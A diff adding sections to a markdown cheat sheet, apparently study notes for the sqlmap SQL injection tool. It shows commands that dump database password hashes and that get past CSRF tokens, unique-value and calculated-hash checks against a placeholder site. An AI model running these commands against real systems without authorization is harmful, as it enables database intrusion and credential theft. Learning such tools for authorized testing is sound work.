@@ -182,3 +182,17 @@ When dealing with complex database structures with numerous tables and columns, 
 ## DB Users Password Enumeration & Cracking
 `sqlmap -u "http://www.example.com/?id=1" --passwords --batch` : `--password` flag is used to dump the content table with database-specific credentials.
 
+## CSRF
+```shell-session
+sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+```
+
+## Unique Value Bypass
+```shell-session
+sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
+```
+
+## Calculated Value Bypass
+```shell-session
+sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
+```
